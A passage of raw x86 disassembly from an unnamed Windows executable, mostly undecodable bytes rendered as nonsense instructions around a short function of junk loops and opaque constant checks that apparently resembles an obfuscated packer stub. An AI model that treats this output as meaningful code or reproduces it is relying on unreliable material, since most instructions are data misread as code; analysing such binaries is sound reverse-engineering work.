  40d3b4:	pop    ss
  40d3b5:	add    dh,bh
  40d3b7:	mov    ch,0xac
  40d3b9:	add    ch,BYTE PTR [eax+0x7e5c6de9]
  40d3bf:	fisubr WORD PTR [edi]
  40d3c1:	mov    ds:0xba895603,al
  40d3c6:	je     0x40d417
  40d3c8:	loop   0x40d42c
  40d3ca:	pop    ecx
  40d3cb:	cdq    
  40d3cc:	push   0x27
  40d3ce:	jp     0x40d381
  40d3d0:	in     eax,0xcc
  40d3d2:	popf   
  40d3d3:	popa   
  40d3d4:	test   edx,0x9e374618
  40d3da:	fstp   TBYTE PTR [ebp-0xe26bcd]
  40d3e0:	mov    eax,0x20060f71
  40d3e5:	ins    DWORD PTR es:[edi],dx
  40d3e6:	mov    dh,0xda
  40d3e8:	sbb    edx,0x1ca4cee3
  40d3ee:	retf   
  40d3ef:	dec    ebp
  40d3f0:	rcl    DWORD PTR [esi+0x15549cf0],1
  40d3f6:	mov    ecx,0x8adeb07f
  40d3fb:	and    esi,eax
  40d3fd:	repnz dec esp
  40d3ff:	jmp    0xc62e:0x6d2e218e
  40d406:	pop    esp
  40d407:	cmp    al,0x62
  40d409:	mov    ah,0xf
  40d40b:	and    bh,BYTE PTR [eax]
  40d40d:	pop    edx
  40d40e:	fidiv  WORD PTR [edx-0x78]
  40d411:	pop    eax
  40d412:	fistp  QWORD PTR [ecx-0x2fda81ea]
  40d418:	push   0x784aa059
  40d41d:	sub    eax,0xbcedb23d
  40d422:	aam    0x74
  40d424:	ja     0x40d3e8
  40d426:	jns    0x40d3b4
  40d428:	jp     0x40d497
  40d42a:	ret    
  40d42b:	mov    esp,0x9fb0f41b
  40d430:	mov    ds:0xd82407b4,al
  40d435:	xchg   esp,eax
  40d436:	jae    0x40d495
  40d438:	sbb    al,0x45
  40d43a:	pop    ecx
  40d43b:	sbb    DWORD PTR [ebp+0x48],edi
  40d43e:	or     DWORD PTR [ebx],0x70
  40d441:	fwait
  40d442:	add    eax,0x5fcd30ee
  40d447:	push   ebx
  40d448:	jle    0x40d432
  40d44a:	shl    DWORD PTR ds:[esi+0x76],0x43
  40d44f:	retf   0xf434
  40d452:	jl     0x40d411
  40d454:	xchg   ebx,eax
  40d455:	sbb    ch,BYTE PTR [edx+0x3b9eae73]
  40d45b:	out    dx,eax
  40d45c:	cli    
  40d45d:	add    al,0xa6
  40d45f:	daa    
  40d460:	icebp  
  40d461:	jecxz  0x40d47f
  40d463:	xor    dl,0xc2
  40d466:	loope  0x40d487
  40d468:	pop    ebx
  40d469:	push   esp
  40d46a:	jge    0x40d420
  40d46c:	aaa    
  40d46d:	dec    edx
  40d46e:	stc    
  40d46f:	out    0x11,al
  40d471:	jns    0x40d46b
  40d473:	fs add al,0xc0
  40d476:	or     BYTE PTR [edx+0x5e85be15],cl
  40d47c:	das    
  40d47d:	cmp    al,0x7c
  40d47f:	adc    BYTE PTR [esp+ebp*1],dh
  40d482:	retf   
  40d483:	aam    0xcc
  40d485:	addr16 jg 0x40d436
  40d488:	leave  
  40d489:	out    0x7f,eax
  40d48b:	repz (bad) 
  40d48e:	repz in eax,0x7f
  40d491:	cmp    eax,0xe5f595ae
  40d496:	aad    0x3e
  40d498:	clc    
  40d499:	lock (bad) 
  40d49b:	(bad)  
  40d49c:	lock inc ebx
  40d49e:	cmc    
  40d49f:	xchg   esp,eax
  40d4a0:	xor    cl,BYTE PTR [ebx+0x73]
  40d4a3:	add    al,cl
  40d4a5:	push   eax
  40d4a6:	cmc    
  40d4a7:	in     al,dx
  40d4a8:	mov    ch,0x19
  40d4aa:	and    BYTE PTR [edi-0x68],dh
  40d4ad:	xor    DWORD PTR [ecx+0x17],0xb72151a1
  40d4b4:	add    ebp,ebp
  40d4b6:	dec    esi
  40d4b7:	jg     0x40d443
  40d4b9:	push   0x5b
  40d4bb:	repnz enter 0x78e7,0x44
  40d4c0:	push   esp
  40d4c1:	jnp    0x40d44c
  40d4c3:	push   edi
  40d4c4:	in     eax,0xd8
  40d4c6:	dec    ecx
  40d4c7:	out    0x63,al
  40d4c9:	mov    ecx,0xa30eb163
  40d4ce:	fstp   st(6)
  40d4d0:	fild   WORD PTR [edi-0x3f77dcaf]
  40d4d6:	sbb    bh,bl
  40d4d8:	xchg   DWORD PTR [esi+eax*4-0x7f],ebp
  40d4dc:	xlat   BYTE PTR ds:[ebx]
  40d4dd:	out    0x67,eax
  40d4df:	mov    al,0xd
  40d4e1:	mov    al,0xa7
  40d4e3:	nop
  40d4e4:	sub    esi,0xfc26ef82
  40d4ea:	push   ds
  40d4eb:	retf   
  40d4ec:	jnp    0x40d552
  40d4ee:	sub    DWORD PTR [bx+di+0x69a5],esi
  40d4f3:	dec    ecx
  40d4f4:	mov    ebx,DWORD PTR [esi]
  40d4f6:	mov    dl,BYTE PTR [esi+0x4c94fda7]
  40d4fc:	call   0x8dbedb6a
  40d501:	test   ebx,ecx
  40d503:	push   esi
  40d504:	outs   dx,DWORD PTR ds:[esi]
  40d505:	adc    DWORD PTR [ecx-0x579ff9d5],edx
  40d50b:	stos   DWORD PTR es:[edi],eax
  40d50c:	std    
  40d50d:	(bad)  
  40d50e:	pop    ss
  40d50f:	pop    es
  40d510:	repz cld 
  40d512:	dec    ebp
  40d513:	js     0x40d50f
  40d515:	sub    edi,ecx
  40d517:	aas    
  40d518:	loopne 0x40d572
  40d51a:	loopne 0x40d4d3
  40d51c:	scas   eax,DWORD PTR es:[edi]
  40d51d:	cmp    eax,0xb8b30663
  40d522:	inc    esp
  40d523:	shr    bl,0xfd
  40d526:	adc    esi,edx
  40d528:	adc    DWORD PTR [eax-0x6f77a135],edx
  40d52e:	mov    bl,BYTE PTR [edx-0x17]
  40d531:	retf   
  40d532:	ins    DWORD PTR es:[edi],dx
  40d533:	ja     0x40d5a1
  40d535:	mov    esi,0x7dda4852
  40d53a:	sbb    DWORD PTR [ebx+0x46],ebp
  40d53d:	icebp  
  40d53e:	sti    
  40d53f:	mov    cl,0x48
  40d541:	or     BYTE PTR [edi],cl
  40d543:	add    al,0x66
  40d545:	out    0x4d,eax
  40d547:	sahf   
  40d548:	jno    0x40d513
  40d54a:	add    DWORD PTR [ebp-0x34],ecx
  40d54d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d54e:	out    dx,al
  40d54f:	hlt    
  40d550:	inc    esp
  40d551:	sbb    eax,0x880a1e8d
  40d556:	loop   0x40d4f3
  40d558:	jo     0x40d542
  40d55a:	jns    0x40d53a
  40d55c:	mov    al,0x23
  40d55f:	sbb    ebx,edx
  40d561:	and    ebx,esp
  40d563:	mov    ecx,DWORD PTR [ebx+0xe]
  40d566:	repz mov eax,ds:0xa24c1a97
  40d56c:	xor    ecx,ebx
  40d56e:	dec    edi
  40d56f:	gs mov eax,0x294aec17
  40d575:	xor    cl,BYTE PTR [ebx]
  40d577:	add    eax,0x9a3b8376
  40d57c:	push   0x32
  40d57e:	mov    ch,0xc4
  40d580:	pop    es
  40d581:	sub    edx,0x48
  40d584:	or     DWORD PTR [edi-0x78],ecx
  40d587:	sub    BYTE PTR [eax],dh
  40d589:	in     eax,dx
  40d58a:	inc    ebx
  40d58b:	add    ebx,DWORD PTR [edx+ebx*1]
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4336a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433697,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43369b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4336a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4336e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43369b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433727,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43372f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43365b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4336db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433717,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433717
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433717,edx
  40d64f:	cmp    DWORD PTR ds:0x433717,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433717,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433663,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433663
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433663,edx
  40d68b:	cmp    DWORD PTR ds:0x433663,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433753
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433663,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433667
  40d6b7:	add    eax,DWORD PTR ds:0x43369b
  40d6bd:	mov    ds:0x433667,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x17a0482a
  40d6f9:	sub    DWORD PTR [edi+edx*8+0x7e7e927a],edi
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d76c
  40d705:	mov    ch,0x3f
  40d707:	adc    BYTE PTR [eax],al
  40d709:	adc    eax,0x6bada559
  40d70e:	cwde   
  40d70f:	jecxz  0x40d78c
  40d711:	sahf   
  40d712:	sbb    eax,0x99d6e0c2
  40d717:	lahf   
  40d718:	out    0x1a,al
  40d71a:	test   BYTE PTR [esp+eiz*2+0x42f21756],al
  40d721:	push   esp
  40d722:	mov    al,0xa4
  40d724:	call   0x6ff:0x28a32017
  40d72b:	ret    0xa9db
  40d72e:	outs   dx,BYTE PTR ds:[esi]
  40d72f:	jge    0x40d6ef
  40d731:	jg     0x40d75d
  40d733:	mov    dh,0xa3
  40d735:	jecxz  0x40d753
  40d737:	mov    ss,WORD PTR [ecx+0x5b8cf7e0]
  40d73d:	scas   eax,DWORD PTR es:[edi]
  40d73e:	es js  0x40d76c
  40d741:	mov    BYTE PTR [edi+0x149145f4],0xa5
  40d748:	lods   eax,DWORD PTR ds:[esi]
  40d749:	outs   dx,BYTE PTR ds:[esi]
  40d74a:	and    esi,0x602f1757
  40d750:	scas   al,BYTE PTR es:[edi]
  40d751:	cwde   
  40d752:	nop
  40d753:	cmc    
  40d754:	stc    
  40d755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d756:	inc    ecx
  40d757:	in     eax,dx
  40d758:	mul    ecx
  40d75a:	iret   
  40d75b:	push   ds
  40d75c:	xchg   eax,eax
  40d75e:	or     eax,0x94a2bc98
  40d763:	mov    al,ds:0x6505425a
  40d768:	sar    BYTE PTR [edx],cl
  40d76a:	retf   
  40d76b:	and    al,0xb1
  40d76d:	mov    eax,ds:0x28f2cefc
  40d772:	xchg   ebx,eax
  40d773:	inc    eax
  40d774:	mov    al,ds:0x7f7dd23f
  40d779:	ins    BYTE PTR es:[edi],dx
  40d77a:	pop    ecx
  40d77b:	mov    ch,0xa
  40d77d:	jp     0x40d799
  40d77f:	(bad)  
  40d780:	jns    0x40d775
  40d782:	inc    ebx
  40d783:	enter  0xd55b,0x2
  40d787:	icebp  
  40d788:	loope  0x40d712
  40d78a:	in     al,dx
  40d78b:	jmp    0x40d70d
  40d78d:	mov    ebx,ebp
  40d78f:	mov    gs,edx
  40d791:	mov    ch,0xc7
  40d793:	cmp    al,0xe9
  40d795:	inc    edx
  40d796:	popa   
  40d797:	dec    esp
  40d798:	inc    edx
  40d799:	movlps xmm4,QWORD PTR [ecx]
  40d79c:	outs   dx,DWORD PTR ds:[esi]
  40d79d:	aam    0x53
  40d79f:	pop    ss
  40d7a0:	mov    eax,ds:0xf1bc9dd9
  40d7a5:	mov    al,0x58
  40d7a7:	imul   ecx,DWORD PTR [eax],0x41806b80
  40d7ad:	(bad)  
  40d7ae:	push   0x0
  40d7b0:	test   eax,0x62c54f62
  40d7b5:	sub    ah,BYTE PTR [ebx]
  40d7b7:	aad    0xff
  40d7b9:	fsubr  DWORD PTR [ecx+0x18]
  40d7bc:	les    esi,FWORD PTR [edi-0x2d4cbe69]
  40d7c2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40d7c4:	pop    eax
  40d7c5:	das    
  40d7c6:	pop    edx
  40d7c7:	leave  
  40d7c8:	sub    dl,bh
  40d7ca:	dec    ah
  40d7cc:	push   es
  40d7cd:	mov    ds:0x49fc50be,al
  40d7d2:	je     0x40d809
  40d7d4:	fwait
  40d7d5:	sub    eax,0x5c0fd6b0
  40d7da:	in     eax,0x8f
  40d7dc:	rcr    ebx,1
  40d7de:	xchg   ecx,eax
  40d7df:	cmp    DWORD PTR [ecx],edi
  40d7e1:	xchg   esi,eax
  40d7e2:	jbe    0x40d7e4
  40d7e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7e5:	stos   DWORD PTR es:[edi],eax
  40d7e6:	sub    DWORD PTR [edi-0x1c3063c1],0x11692dce
  40d7f0:	mov    WORD PTR [eax-0x46544d1d],?
  40d7f6:	xor    al,0x9a
  40d7f8:	out    dx,eax
  40d7f9:	(bad)  
  40d7fb:	repnz mov eax,ds:0xfa1d9d15
  40d801:	xchg   edi,eax
  40d802:	inc    esp
  40d803:	jne    0x40d7db
  40d805:	jge    0x40d843
  40d807:	rol    DWORD PTR [esi-0x6e],1
  40d80a:	add    eax,0xfd672151
  40d80f:	xor    DWORD PTR [eax+0x9],edi
  40d812:	test   BYTE PTR [esi],dl
  40d814:	data16 fnstsw WORD PTR [edx+ebx*1+0x27ff6844]
  40d81c:	out    0xca,eax
  40d81e:	dec    ecx
  40d81f:	pop    eax
  40d820:	mov    bl,0x9c
  40d822:	rcr    DWORD PTR [esi+0x3f],cl
  40d825:	retf   0xe470
  40d828:	adc    DWORD PTR [ecx+esi*1],esp
  40d82b:	adc    dl,cl
  40d82d:	push   edx
  40d82e:	inc    ebx
  40d82f:	int    0xc9
  40d831:	pop    ebx
  40d832:	or     bh,0xc9
  40d835:	loop   0x40d829
  40d837:	clc    
  40d838:	repz sub DWORD PTR [ebx],ebp
  40d83b:	or     BYTE PTR [edx],dh
  40d83d:	jno    0x40d836
  40d83f:	cmp    edx,ebx
  40d841:	or     esi,DWORD PTR [ebp+0x6a336625]
  40d847:	pop    esp
  40d848:	add    BYTE PTR [ebx],bl
  40d84a:	aas    
  40d84b:	push   esi
  40d84c:	mov    dl,0x27
  40d84e:	add    al,0x6
  40d850:	jecxz  0x40d841
  40d852:	push   edx
  40d853:	add    BYTE PTR [edx-0x79fa721c],ch
  40d859:	jg     0x40d7eb
  40d85b:	mov    es,WORD PTR [eax-0x7a3e12d0]
  40d861:	inc    ebx
  40d862:	sahf   
  40d863:	cmc    
  40d864:	jnp    0x40d88d
  40d866:	sub    edi,ebp
  40d868:	into   
  40d869:	fwait
  40d86a:	loopne 0x40d81a
  40d86c:	push   ebp
  40d86d:	test   eax,0x67d5ed42
  40d872:	test   eax,0x796b4550
  40d877:	dec    ecx
  40d878:	js     0x40d8a3
  40d87a:	xchg   edi,eax
  40d87b:	jmp    0x40d89b
  40d87d:	aam    0xff
  40d87f:	nop
  40d880:	dec    eax
  40d881:	mov    ah,0x43
  40d883:	jmp    0x2963:0x550d524b
  40d88a:	mov    eax,0xe233fa4f
  40d88f:	mov    ebx,0x8fa64b1f
  40d894:	mov    ds:0x7e5e3ae4,eax
  40d899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d89a:	pusha  
  40d89b:	cli    
  40d89c:	sbb    ch,bh
  40d89e:	or     eax,0xff173a50
  40d8a3:	jo     0x40d8aa
  40d8a5:	or     esi,eax
  40d8a7:	pop    esi
  40d8a8:	mov    WORD PTR [esi],ds
  40d8aa:	and    al,0x34
  40d8ac:	add    al,BYTE PTR [ebp-0x729596bb]
  40d8b2:	push   edi
  40d8b3:	cmp    al,0x2e
  40d8b5:	adc    al,0x55
  40d8b7:	pop    eax
  40d8b8:	int    0x78
  40d8ba:	pusha  
  40d8bb:	cdq    
  40d8bc:	adc    edx,DWORD PTR [edx+0x64f8ea89]
  40d8c2:	jnp    0x40d93a
  40d8c4:	das    
  40d8c5:	les    esp,FWORD PTR [eax]
  40d8c7:	std    
  40d8c8:	adc    ebp,DWORD PTR [ecx]
  40d8ca:	popf   
  40d8cb:	adc    esp,ebx
  40d8cd:	fdiv   QWORD PTR [edx+0x69]
  40d8d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8d1:	inc    edi
  40d8d2:	cli    
  40d8d3:	jecxz  0x40d8e7
  40d8d5:	cmp    eax,0xf8305c43
  40d8da:	loop   0x40d892
  40d8dc:	pop    esi
  40d8dd:	or     ebp,edx
  40d8df:	loopne 0x40d8a1
  40d8e1:	xchg   esp,eax
  40d8e2:	cld    
  40d8e3:	or     ecx,eax
  40d8e5:	scas   al,BYTE PTR es:[edi]
  40d8e6:	pop    edx
  40d8e7:	les    ebx,FWORD PTR [edi]
  40d8e9:	lods   al,BYTE PTR ds:[esi]
  40d8ea:	call   0x5bc:0x23f3a284
  40d8f1:	test   DWORD PTR [esi],eax
  40d8f3:	jle    0x40d930
  40d8f5:	(bad)  
  40d8f7:	sub    ebx,DWORD PTR [ebx-0x539de8df]
  40d8fd:	mov    eax,0x3f794449
  40d902:	xchg   ebp,eax
  40d903:	sbb    eax,0x39d1a786
  40d908:	into   
  40d909:	dec    esp
  40d90a:	adc    ah,ah
  40d90c:	sub    ebx,0x76c5072f
  40d912:	sub    DWORD PTR [esi+0x6f],esp
  40d915:	jnp    0x40d938
  40d917:	adc    dl,al
  40d919:	add    dl,BYTE PTR [esi]
  40d91b:	cmc    
  40d91c:	xchg   DWORD PTR [ebp-0x4fe2e898],eax
  40d922:	aas    
  40d923:	ret    
  40d924:	fwait
  40d925:	rol    BYTE PTR [eax-0x1b100627],0x5c
  40d92c:	bound  edx,QWORD PTR ds:0x75640b80
  40d932:	popa   
  40d933:	gs jo  0x40d931
  40d936:	dec    ebp
  40d937:	pop    ss
  40d938:	inc    BYTE PTR [ecx]
  40d93a:	add    edi,DWORD PTR [ecx-0x63]
  40d93d:	xor    eax,0xa6f7adec
  40d942:	xchg   edx,eax
  40d943:	out    dx,al
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xd42b51ed
  40d96a:	adc    eax,0x903a9fad
  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d966
  40d976:	adc    eax,0x846b2d6d
  40d97b:	sbb    DWORD PTR [eax],esp
  40d97d:	int    0xc1
  40d97f:	not    DWORD PTR [ecx-0x3f01f3fc]
  40d985:	sahf   
  40d986:	clc    
  40d987:	pop    edx
  40d988:	jnp    0x40d9ff
  40d98a:	cmp    al,0xc4
  40d98c:	mov    esi,0x898f882b
  40d991:	mov    ch,0x50
  40d993:	and    DWORD PTR [edi+ebx*1+0x5049c25b],edi
  40d99a:	xchg   ecx,eax
  40d99b:	mov    ds,WORD PTR [ecx-0x79]
  40d99e:	push   ecx
  40d99f:	mul    DWORD PTR [esi]
  40d9a1:	ror    BYTE PTR [edx-0x3cad3026],1
  40d9a7:	jmp    0x40d9c7
  40d9a9:	icebp  
  40d9aa:	push   eax
  40d9ab:	iret   
  40d9ac:	pushf  
  40d9ad:	xchg   edx,esp
  40d9af:	cdq    
  40d9b0:	out    0x32,eax
  40d9b2:	bnd jmp 0x40d9b3
  40d9b5:	cmp    edi,DWORD PTR [edi-0x54]
  40d9b8:	lahf   
  40d9b9:	sub    BYTE PTR [eax],ch
  40d9bb:	icebp  
  40d9bc:	outs   dx,DWORD PTR cs:[esi]
  40d9be:	xor    eax,edx
  40d9c0:	sbb    al,0xc6
  40d9c2:	pop    edx
  40d9c3:	push   esi
  40d9c4:	mov    BYTE PTR [eax+edx*8+0x4ed3c2c4],al
  40d9cb:	or     dl,bh
  40d9cd:	xchg   DWORD PTR [ecx+0x37],ecx
  40d9d0:	sar    ebx,1
  40d9d2:	inc    edi
  40d9d3:	fbstp  TBYTE PTR [ebx-0x59e8b2d0]
  40d9d9:	dec    ebx
  40d9da:	cwde   
  40d9db:	popf   
  40d9dc:	add    al,0xe4
  40d9de:	inc    esp
  40d9df:	jmp    0x4d1268ae
  40d9e4:	loop   0x40d9fc
  40d9e6:	add    DWORD PTR ds:0x32b73fc0,ecx
  40d9ec:	jbe    0x40d997
  40d9ee:	es jb  0x40d9ee
  40d9f1:	pusha  
  40d9f2:	cld    
  40d9f3:	popa   
  40d9f4:	pop    ebp
  40d9f5:	ds mov ebp,0x12027f91
  40d9fb:	scas   al,BYTE PTR es:[edi]
  40d9fc:	shl    ebx,1
  40d9fe:	push   ss
  40d9ff:	inc    ecx
  40da00:	xor    DWORD PTR [ecx],edx
  40da02:	sub    bh,BYTE PTR [edx+0x13]
  40da05:	jmp    0x183a:0x134ee063
  40da0c:	xchg   DWORD PTR [edx+0x5dae2c94],esp
  40da12:	es jb  0x40d9ab
  40da15:	jge    0x40da5e
  40da17:	int    0x3c
  40da19:	xlat   BYTE PTR ds:[ebx]
  40da1a:	enter  0x655,0xea
  40da1e:	bswap  ebx
  40da20:	sbb    eax,0xb6a9249c
  40da25:	icebp  
  40da26:	ds inc eax
  40da28:	je     0x40d9f0
  40da2a:	lods   eax,DWORD PTR ds:[esi]
  40da2b:	shl    BYTE PTR [esi],0x1b
  40da2e:	dec    edx
  40da2f:	lea    ebx,[edi-0x6403c6c4]
  40da35:	sbb    ecx,DWORD PTR [eax]
  40da37:	sbb    BYTE PTR [eax+0x512807d0],dh
  40da3d:	sbb    DWORD PTR [ebp-0x4f],ebx
  40da40:	(bad)  
  40da41:	mov    dl,0x63
  40da43:	xchg   ebp,eax
  40da44:	jno    0x40dabd
  40da46:	cs iret 
  40da48:	push   ebx
  40da49:	and    esp,ebp
  40da4b:	nop
  40da4c:	mov    eax,ds:0xfe6b61f5
  40da51:	std    
  40da52:	pop    ecx
  40da53:	push   esp
  40da54:	ja     0x40daa2
  40da56:	popf   
  40da57:	and    edx,DWORD PTR [edi+0xfd3e8b5]
  40da5d:	jnp    0x40da1f
  40da5f:	pop    ss
  40da60:	aaa    
  40da61:	ds adc al,0x9f
  40da64:	sub    eax,0x21e5a12e
  40da69:	add    bh,cl
  40da6b:	mov    DWORD PTR [esi+ebp*8],eax
  40da6e:	gs fucompp 
  40da71:	push   esi
  40da72:	pop    esi
  40da73:	inc    esi
  40da74:	jne    0x40dadd
  40da76:	or     DWORD PTR [edi+0x7820129b],eax
  40da7c:	(bad)
  40da80:	jns    0x40da44
  40da82:	push   0xffffffe6
  40da84:	nop
  40da85:	mov    cl,0x84
  40da87:	xchg   edx,eax
  40da88:	jne    0x40daaa
  40da8a:	mov    ah,0xc9
  40da8c:	popf   
  40da8d:	jne    0x40da9f
  40da8f:	jno    0x40da3b
  40da91:	rol    DWORD PTR [ecx+0x5e],cl
  40da94:	xlat   BYTE PTR ds:[ebx]
  40da95:	adc    eax,0x104cfdb5
  40da9a:	mov    esp,0x7b66fba0
  40da9f:	mov    es,WORD PTR [edi]
  40daa1:	aam    0x5
  40daa3:	int    0xdb
  40daa5:	pushf  
  40daa6:	sbb    eax,0xa29d6668
  40daab:	pushf  
  40daac:	hlt    
  40daad:	fwait
  40daae:	cmp    DWORD PTR [eax-0x74],edi
  40dab1:	pop    ebp
  40dab2:	mov    ecx,0x7624fcc6
  40dab7:	aam    0x14
  40dab9:	(bad)  
  40daba:	cmp    BYTE PTR [edx],bh
  40dabc:	mov    esp,0x2b530d37
  40dac1:	loope  0x40daf7
  40dac3:	ins    DWORD PTR es:[edi],dx
  40dac4:	(bad)  
  40dac6:	sbb    esi,DWORD PTR [eax]
  40dac8:	xchg   ebp,eax
  40dac9:	mov    cl,0x25
  40dacb:	fwait
  40dacc:	add    dl,cl
  40dace:	add    ch,BYTE PTR [esi+0x48]
  40dad1:	add    dh,bl
  40dad3:	mov    al,BYTE PTR [ebp+0x2a30c428]
  40dad9:	mov    esi,DWORD PTR [esi]
  40dadb:	xchg   edi,eax
  40dadc:	and    bh,BYTE PTR [edx]
  40dade:	or     cl,BYTE PTR [esi]
  40dae0:	outs   dx,BYTE PTR ds:[esi]
  40dae1:	adc    eax,0x3c261347
  40dae6:	lahf   
  40dae7:	pop    esp
  40dae8:	sti    
  40dae9:	adc    bh,BYTE PTR [eax]
  40daeb:	retf   0x27a9
  40daee:	jmp    DWORD PTR [ebp+0x55]
  40daf1:	sub    eax,0xa70f790a
  40daf6:	mov    WORD PTR [esi-0x4c48aa60],cs
  40dafc:	retf   
  40dafd:	sub    eax,0xdd04c623
  40db02:	mov    BYTE PTR [edi+0x42ad60fd],ch
  40db08:	mul    BYTE PTR [eax+0x45]
  40db0b:	xor    DWORD PTR [ecx+0x39b865b7],0xfffffff2
  40db12:	sbb    ebp,DWORD PTR [edi+eax*4]
  40db15:	sbb    eax,0x3aea5fda
  40db1a:	scas   eax,DWORD PTR es:[edi]
  40db1b:	popf   
  40db1c:	inc    ebx
  40db1d:	leave  
  40db1e:	xlat   BYTE PTR ds:[ebx]
  40db1f:	bound  ebx,QWORD PTR [ebx]
  40db21:	xor    esi,DWORD PTR [eax+eiz*1-0x2b]
  40db25:	loop   0x40dada
  40db27:	add    esi,DWORD PTR [edx+0x1]
  40db2a:	push   0xdc9b5e4c
  40db2f:	int    0x44
  40db31:	pusha  
  40db32:	lock aaa 
  40db34:	mov    BYTE PTR [edx-0x61],0x74
  40db38:	mov    DWORD PTR [ebx],esp
  40db3a:	or     eax,0x54bcc9d
  40db3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db40:	mov    al,0xa0
  40db42:	leave  
  40db43:	mov    al,0x2e
  40db45:	in     al,dx
  40db46:	pop    es
  40db47:	and    DWORD PTR ds:0x1fd67c21,ebp
  40db4d:	loop   0x40db33
  40db4f:	or     eax,DWORD PTR [esp+ecx*8]
  40db52:	dec    ecx
  40db53:	pop    eax
  40db54:	mov    WORD PTR [esi-0x75929470],cs
  40db5a:	shl    DWORD PTR [eax-0x7a12e391],0x91
  40db61:	and    bl,BYTE PTR [ebp+0x54]
  40db64:	sti    
  40db65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db66:	pop    eax
  40db67:	ja     0x40dba8
  40db69:	jle    0x40db03
  40db6b:	mov    dh,0xcd
  40db6d:	pop    ebp
  40db6e:	ret    
  40db6f:	outs   dx,DWORD PTR ds:[esi]
  40db70:	xchg   ch,cl
  40db72:	mov    edi,0x19074f51
  40db77:	add    eax,ebx
  40db79:	mov    eax,0x170dbb9e
  40db7e:	xchg   DWORD PTR [edi+ebx*4+0xd],ebp
  40db82:	adc    al,0x6
  40db84:	xchg   edx,eax
  40db85:	je     0x40dbf0
  40db87:	inc    eax
  40db88:	div    BYTE PTR [ebx]
  40db8a:	add    al,0xb4
  40db8c:	dec    ebx
  40db8d:	test   eax,0x44adb5bf
  40db92:	pusha  
  40db93:	adc    ah,BYTE PTR [edi-0x3f8ddd1e]
  40db99:	jno    0x40db5a
  40db9b:	sub    BYTE PTR [ebx+eax*4+0x6c],ch
  40db9f:	sub    eax,0xe0ebd875
  40dba4:	push   esp
  40dba5:	mov    al,ds:0xd507dc49
  40dbaa:	cld    
  40dbab:	popf   
  40dbac:	cmc    
  40dbad:	mov    WORD PTR [edx],?
  40dbaf:	dec    edx
  40dbb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbb1:	loop   0x40dc2b
  40dbb3:	fstp   DWORD PTR [ecx]
  40dbb5:	cmp    eax,ecx
